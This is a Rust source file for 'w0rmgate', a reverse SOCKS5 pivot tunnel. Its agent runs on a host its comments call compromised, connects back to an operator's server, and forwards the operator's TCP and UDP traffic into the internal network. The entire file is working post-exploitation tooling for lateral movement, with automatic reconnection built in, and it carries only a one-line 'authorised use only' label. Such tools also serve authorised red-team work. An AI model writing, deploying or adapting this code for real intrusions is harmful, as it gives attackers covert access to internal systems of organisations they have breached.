mod proto;
mod socks;

use anyhow::Result;
use clap::{Parser, Subcommand};
use proto::{read_frame, write_frame, Frame};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;
use std::net::SocketAddr;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream, UdpSocket};
use tokio::sync::{mpsc, Mutex};
use tokio::time::timeout;

type Streams = Arc<Mutex<HashMap<u32, mpsc::UnboundedSender<Vec<u8>>>>>;
/// UDP associations: id -> sender of (peer "host:port", datagram) back to the relay.
type UdpStreams = Arc<Mutex<HashMap<u32, mpsc::UnboundedSender<(String, Vec<u8>)>>>>;
type Out = mpsc::Sender<Frame>;

const OUT_BUF: usize = 1024;
const DIAL_TIMEOUT: Duration = Duration::from_secs(10);

/// w0rmgate — reverse SOCKS5 pivot tunnel (authorised use only).
#[derive(Parser)]
#[command(name = "w0rmgate", version, about)]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Operator side: accepts the agent and exposes the SOCKS5 proxy.
    Server {
        /// Address the agent connects back to.
        #[arg(long, default_value = "0.0.0.0:7000")]
        control: String,
        /// SOCKS5 proxy for the operator to use.
        #[arg(long, default_value = "127.0.0.1:1080")]
        socks: String,
    },
    /// Compromised-host side: connects back and egresses onto the internal network.
    Agent {
        /// Control address of the operator's server.
        #[arg(long)]
        connect: String,
    },
}

/// Reads from the local socket and pushes DATA into the tunnel; sends CLOSE at EOF.
async fn local_to_mux<R: AsyncReadExt + Unpin>(mut rd: R, id: u32, out: Out, streams: Streams) {
    let mut buf = vec![0u8; 16 * 1024];
    loop {
        match rd.read(&mut buf).await {
            Ok(0) | Err(_) => break,
            Ok(n) => {
                if out.send(Frame::data(id, buf[..n].to_vec())).await.is_err() {
                    break;
                }
            }
        }
    }
    let _ = out.send(Frame::close(id)).await;
    streams.lock().await.remove(&id);
}

/// Receives DATA from the tunnel and writes it to the local socket.
async fn mux_to_local<W: AsyncWriteExt + Unpin>(
    mut wr: W,
    mut rx: mpsc::UnboundedReceiver<Vec<u8>>,
) {
    while let Some(chunk) = rx.recv().await {
        if wr.write_all(&chunk).await.is_err() {
            break;
        }
    }
    let _ = wr.shutdown().await;
}

/// Writer task: serialises frames from many tasks onto the control socket.
async fn writer_task<W: AsyncWriteExt + Unpin>(mut wr: W, mut rx: mpsc::Receiver<Frame>) {
    while let Some(f) = rx.recv().await {
        if write_frame(&mut wr, &f).await.is_err() {
            break;
        }
    }
}

async fn run_server(control: String, socks_addr: String) -> Result<()> {
    let ctrl_listener = TcpListener::bind(&control).await?;
    eprintln!("[*] control listening on {control} (waiting for agent)");
    loop {
        let (agent, peer) = ctrl_listener.accept().await?;
        let _ = agent.set_nodelay(true);
        eprintln!("[+] agent connected: {peer}");
        if let Err(e) = serve_agent(agent, &socks_addr).await {
            eprintln!("[!] session ended: {e}");
        }
        eprintln!("[*] waiting for a new agent...");
    }
}

async fn serve_agent(agent: TcpStream, socks_addr: &str) -> Result<()> {
    let (mut ar, aw) = agent.into_split();
    let (out_tx, out_rx) = mpsc::channel::<Frame>(OUT_BUF);
    let streams: Streams = Arc::new(Mutex::new(HashMap::new()));

    let udp_streams: UdpStreams = Arc::new(Mutex::new(HashMap::new()));
    tokio::spawn(writer_task(aw, out_rx));

    // tunnel reader: dispatches DATA/CLOSE/UDP to the local streams
    let streams_r = streams.clone();
    let udp_r = udp_streams.clone();
    let reader = tokio::spawn(async move {
        loop {
            let f = match read_frame(&mut ar).await {
                Ok(f) => f,
                Err(_) => break,
            };
            match f.kind {
                proto::DATA => {
                    let tx = streams_r.lock().await.get(&f.id).cloned();
                    if let Some(tx) = tx {
                        let _ = tx.send(f.data);
                    }
                }
                proto::CLOSE => {
                    streams_r.lock().await.remove(&f.id);
                }
                proto::UDP => {
                    if let Some((addr, data)) = proto::parse_udp(&f.data) {
                        let tx = udp_r.lock().await.get(&f.id).cloned();
                        if let Some(tx) = tx {
                            let _ = tx.send((addr, data.to_vec()));
                        }
                    }
                }
                _ => {}
            }
        }
    });

    // SOCKS acceptor for the operator
    let socks_listener = TcpListener::bind(socks_addr).await?;
    eprintln!("[*] SOCKS5 ready on {socks_addr}");
    let mut next_id: u32 = 1;
    let acceptor = async {
        loop {
            let (mut cli, _) = socks_listener.accept().await?;
            let _ = cli.set_nodelay(true);
            let cmd = match socks::handshake(&mut cli).await {
                Ok(c) => c,
                Err(_) => continue,
            };
            let id = next_id;
            next_id = next_id.wrapping_add(1).max(1);
            match cmd {
                socks::Command::Connect(target) => {
                    if socks::reply_connect(&mut cli).await.is_err() {
                        continue;
                    }
                    let (tx, rx) = mpsc::unbounded_channel::<Vec<u8>>();
                    streams.lock().await.insert(id, tx);
                    if out_tx.send(Frame::open(id, &target)).await.is_err() {
                        break;
                    }
                    let (cr, cw) = cli.into_split();
                    tokio::spawn(mux_to_local(cw, rx));
                    tokio::spawn(local_to_mux(cr, id, out_tx.clone(), streams.clone()));
                }
                socks::Command::UdpAssociate => {
                    tokio::spawn(handle_udp(cli, id, out_tx.clone(), udp_streams.clone()));
                }
            }
        }
        #[allow(unreachable_code)]
        Ok::<(), anyhow::Error>(())
    };

    tokio::select! {
        _ = reader => {            eprintln!("[!] agent disconnected");
        }
        r = acceptor => { r?; }
    }
    Ok(())
}

/// Server side of a SOCKS5 UDP ASSOCIATE: opens a relay UDP socket, tunnels the
/// client's datagrams to the agent and routes responses back.
async fn handle_udp(mut cli: TcpStream, id: u32, out: Out, udp_streams: UdpStreams) {
    let relay = match UdpSocket::bind("127.0.0.1:0").await {
        Ok(s) => Arc::new(s),
        Err(_) => return,
    };
    let bnd = match relay.local_addr() {
        Ok(a) => a,
        Err(_) => return,
    };
    if socks::reply_udp(&mut cli, bnd).await.is_err() {
        return;
    }
    let (tx, mut rx) = mpsc::unbounded_channel::<(String, Vec<u8>)>();
    udp_streams.lock().await.insert(id, tx);
    let client_addr: Arc<Mutex<Option<SocketAddr>>> = Arc::new(Mutex::new(None));

    // client datagrams -> tunnel
    let relay_a = relay.clone();
    let ca = client_addr.clone();
    let t1 = tokio::spawn(async move {
        let mut buf = vec![0u8; 64 * 1024];
        loop {
            let (n, src) = match relay_a.recv_from(&mut buf).await {
                Ok(v) => v,
                Err(_) => break,
            };
            *ca.lock().await = Some(src);
            if let Some((target, payload)) = socks::parse_udp_header(&buf[..n]) {
                if out.send(Frame::udp(id, &target, payload)).await.is_err() {
                    break;
                }
            }
        }
    });

    // tunnel responses -> client
    let relay_b = relay.clone();
    let ca2 = client_addr.clone();
    let t2 = tokio::spawn(async move {
        while let Some((peer_str, data)) = rx.recv().await {
            let client = *ca2.lock().await;
            if let (Some(client), Ok(peer)) = (client, peer_str.parse::<SocketAddr>()) {
                let pkt = socks::build_udp_header(peer, &data);
                let _ = relay_b.send_to(&pkt, client).await;
            }
        }
    });

    // hold the association until the control TCP connection closes
    let mut tmp = [0u8; 256];
    loop {
        match cli.read(&mut tmp).await {
            Ok(0) | Err(_) => break,
            Ok(_) => {}
        }
    }
    udp_streams.lock().await.remove(&id);
    t1.abort();
    t2.abort();
}

async fn run_agent(connect: String) -> Result<()> {
    loop {
        eprintln!("[*] connecting back to {connect}");
        match TcpStream::connect(&connect).await {
            Ok(s) => {
                let _ = s.set_nodelay(true);
                eprintln!("[+] tunnel established");
                if let Err(e) = agent_session(s).await {
                    eprintln!("[!] tunnel dropped: {e}");
                }
            }
            Err(e) => eprintln!("[!] connect failed: {e}"),
        }
        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

async fn agent_session(server: TcpStream) -> Result<()> {
    let (mut sr, sw) = server.into_split();
    let (out_tx, out_rx) = mpsc::channel::<Frame>(OUT_BUF);
    let streams: Streams = Arc::new(Mutex::new(HashMap::new()));
    let udp_socks: Arc<Mutex<HashMap<u32, Arc<UdpSocket>>>> =
        Arc::new(Mutex::new(HashMap::new()));
    tokio::spawn(writer_task(sw, out_rx));

    loop {
        let f = read_frame(&mut sr).await?;
        match f.kind {
            proto::UDP => {
                if let Some((target, data)) = proto::parse_udp(&f.data) {
                    let id = f.id;
                    // reuse the association's socket, or create it and start a
                    // task that forwards replies back over the tunnel
                    let sock = {
                        let mut map = udp_socks.lock().await;
                        if let Some(s) = map.get(&id) {
                            s.clone()
                        } else if let Ok(s) = UdpSocket::bind("0.0.0.0:0").await {
                            let s = Arc::new(s);
                            map.insert(id, s.clone());
                            let recv_sock = s.clone();
                            let out = out_tx.clone();
                            tokio::spawn(async move {
                                let mut buf = vec![0u8; 64 * 1024];
                                loop {
                                    let (n, from) = match recv_sock.recv_from(&mut buf).await {
                                        Ok(v) => v,
                                        Err(_) => break,
                                    };
                                    if out
                                        .send(Frame::udp(id, &from.to_string(), &buf[..n]))
                                        .await
                                        .is_err()
                                    {
                                        break;
                                    }
                                }
                            });
                            s
                        } else {
                            continue;
                        }
                    };
                    let _ = sock.send_to(data, &target).await;
                }
            }
            proto::OPEN => {
                let target = String::from_utf8_lossy(&f.data).to_string();
                let id = f.id;
                let out = out_tx.clone();
                let streams = streams.clone();
                // Register the stream channel BEFORE dialing so DATA frames that
                // arrive mid-connect are queued instead of dropped (head-of-line
                // race between OPEN's async connect and the follow-up DATA).
                let (tx, rx) = mpsc::unbounded_channel::<Vec<u8>>();
                streams.lock().await.insert(id, tx);
                tokio::spawn(async move {
                    match timeout(DIAL_TIMEOUT, TcpStream::connect(&target)).await {
                        Ok(Ok(dst)) => {
                            let _ = dst.set_nodelay(true);
                            let (dr, dw) = dst.into_split();
                            tokio::spawn(mux_to_local(dw, rx));
                            local_to_mux(dr, id, out, streams).await;
                        }
                        _ => {
                            streams.lock().await.remove(&id);
                            let _ = out.send(Frame::close(id)).await;
                        }
                    }
                });
            }
            proto::DATA => {
                let tx = streams.lock().await.get(&f.id).cloned();
                if let Some(tx) = tx {
                    let _ = tx.send(f.data);
                }
            }
            proto::CLOSE => {
                streams.lock().await.remove(&f.id);
            }
            _ => {}
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    match Cli::parse().cmd {
        Cmd::Server { control, socks } => run_server(control, socks).await,
        Cmd::Agent { connect } => run_agent(connect).await,
    }
}
